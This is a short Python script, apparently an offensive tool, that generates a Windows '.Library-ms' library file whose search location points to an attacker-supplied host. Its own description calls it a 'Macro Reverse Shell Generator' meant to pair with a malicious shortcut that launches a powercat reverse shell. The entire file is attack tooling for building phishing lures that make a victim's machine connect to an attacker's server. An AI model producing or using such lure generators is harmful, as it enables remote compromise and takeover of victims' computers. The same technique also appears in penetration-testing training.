import argparse

parser = argparse.ArgumentParser(
    prog="Macro Reverse Shell Generator",
    description="Generate an XML file describing a libary to be loaded with a malicious shortcut file "
    "pointing to a powercat reverse shell",
)

parser.add_argument("-l", "--lhost", required=True)
parser.add_argument("-O", "--outfile")

args = parser.parse_args()

xml = (
    '<?xml version="1.0" encoding="UTF-8"?>\n' \
    '<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">\n' \
    "   <name>@windows.storage.dll,-34582</name>\n" \
    "   <version>6</version>\n" \
    "   <isLibraryPinned>true</isLibraryPinned>\n" \
    "   <iconReference>imageres.dll,-1003</iconReference>\n" \
    "   <templateInfo>\n" \
    "       <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>\n" \
    "   </templateInfo>\n" \
    "   <searchConnectorDescriptionList>\n" \
    "       <searchConnectorDescription>\n" \
    "           <isDefaultSaveLocation>true</isDefaultSaveLocation>\n" \
    "           <isSupported>false</isSupported>\n" \
    "           <simpleLocation>\n" \
    f"               <url>http://{args.lhost}</url>\n" \
    "           </simpleLocation>\n" \
    "       </searchConnectorDescription>\n" \
    "   </searchConnectorDescriptionList>\n" \
    "</libraryDescription>\n"
)

print("\n" + xml)

if args.outfile:
    f = open(f"{args.outfile}.Library-ms", "w")
    f.write(xml)
    f.close()
    print(f'\nLibrary XML written to file "{args.outfile}.Library-ms"')    
